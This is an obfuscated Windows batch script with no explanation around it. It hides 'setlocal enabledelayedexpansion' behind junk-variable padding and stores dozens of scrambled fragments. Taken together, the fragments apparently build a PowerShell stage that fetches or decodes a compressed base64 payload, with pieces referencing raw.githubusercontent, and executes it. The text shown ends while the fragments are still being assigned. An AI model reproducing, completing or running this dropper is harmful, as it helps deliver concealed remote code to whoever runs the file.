@echo off
%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%s%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%e%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%t%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%l%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%o%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%c%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%a%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%l%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY% %mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%e%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%n%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%a%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%b%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%l%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%e%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%d%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%e%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%l%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%a%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%y%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%e%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%d%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%e%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%x%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%p%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%a%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%n%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%s%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%i%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%o%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%n%mjMHMchpowqroitFPJjqFolCYHaTNXpLviEdfTrYUJJVMjAzWY%
set "GonqHGYZUMjlpVasphrQrtogqajHmKtFYLpBWHXafuvFozNrgi=s"
set "KrGatnagZGxqNjsEmDFzwIkqLWXISRnRBdacYYscAPHqDOHlmK=t"
set "lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL=!GonqHGYZUMjlpVasphrQrtogqajHmKtFYLpBWHXafuvFozNrgi!e!KrGatnagZGxqNjsEmDFzwIkqLWXISRnRBdacYYscAPHqDOHlmK!"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "lZHcVJOnbO=$a=["
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "EHRdLkQSNQ=ert]"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "DBJCaHOLdX=::Fr"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "wOyZBBXpDV=')))"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "yJfAmNBtlo=s/he"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "UwcWjFKeoP=thub"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "opAzeWriXs=bjec"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ZCTzKdnvUr=sPow"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "VsvzbtPzPk=);$m"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "imsDdiMexa=pres"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "SArSNhKupj=ew-O"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "IQWtHqiycB=;$r="
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "xCHLlxsamW=pres"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "wcvNJiCgGz=\Sys"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "MudUOpgUpw=ng)."
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "vfbZnfgIxf=trea"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "KhJkfWfIjK=0,$b"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "OmBICMFqrW=user"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "hgIJDtcaDk=bjec"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "xkzwICevaA=ring"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "tHtTXAqNrP=w.gi"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "dRgxglknSK=lock"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "kcJInWmtvX=si.D"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "aCvIVZOlZS=l,$p"
